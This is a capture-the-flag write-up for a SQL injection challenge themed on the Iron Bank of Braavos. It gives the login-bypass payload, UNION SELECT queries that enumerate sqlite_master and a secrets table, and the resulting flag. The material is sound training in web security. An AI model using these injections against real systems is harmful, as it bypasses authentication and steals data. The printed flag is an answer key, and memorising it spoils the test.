# The Iron Bank Heist - Solution

## Challenge Information
- **Name**: The Iron Bank Heist
- **Category**: WEB/GOT (SQL Injection)
- **Port**: 30060
- **Connection**: `nc labs.cyberspacevr.in 30060`

## Challenge Description
The Iron Bank of Braavos keeps the gold of every house in Westeros. Their tellers will admit a customer who knows the proper House name and password, and their software is ancient — written before the great schism of escaped quotes.

**Houses on file**: Lannister, Stark, Targaryen, Greyjoy

**Tip**: A friend from the Watch left you a phrase. The teller might recognize it.

## Solution

### Step 1: Reconnaissance
Connected to the service and discovered the interface:
```
Commands:
    login <user> <password>     authenticate (Westerosi houses only)
    balance <account>           after login
    help
    quit
```

### Step 2: SQL Injection in Login
The login command is vulnerable to SQL injection. Tested various payloads:

**Working payload**: `login Lannister ' OR '1'='1`

This bypasses authentication and logs in as House Lannister.

### Step 3: Database Enumeration
After successful login, used SQL injection in the `balance` command to enumerate the database structure:

**Command**: `balance ' UNION SELECT name, sql FROM sqlite_master--`

**Result**: Discovered three tables:
1. `accounts` - (id, house, account, balance)
2. `customers` - (id, house, password)
3. `secrets` - (id, name, payload)

### Step 4: Extract Flag
The flag is stored in the `secrets` table. Used UNION SELECT to extract it:

**Command**: `balance ' UNION SELECT name, payload FROM secrets--`

**Result**:
```
Account              Balance
--------------------------------------
ledger               Iron Bank ledger format hint: header is base64-padded JSON, body is HMAC-SHA256.
                     (This shape mirrors the JWT signing scheme used by the Faceless Verifier of Braavos.)
vault                SpaceCTF{lannisters_always_pay_their_HHCLZW}
```

## Flag
```
SpaceCTF{lannisters_always_pay_their_HHCLZW}
```

## Key Techniques
1. **SQL Injection Authentication Bypass**: `' OR '1'='1`
2. **Database Structure Enumeration**: `UNION SELECT` with `sqlite_master`
3. **Data Extraction**: `UNION SELECT` from discovered tables

## Additional Notes
- The challenge also revealed a hint about JWT signing that may be useful for other challenges
- The "friend from the Watch" hint was a red herring - the solution was pure SQL injection
- The ancient software reference pointed to the SQL injection vulnerability

## Solver Script
See: `iron_bank_final_flag.py`
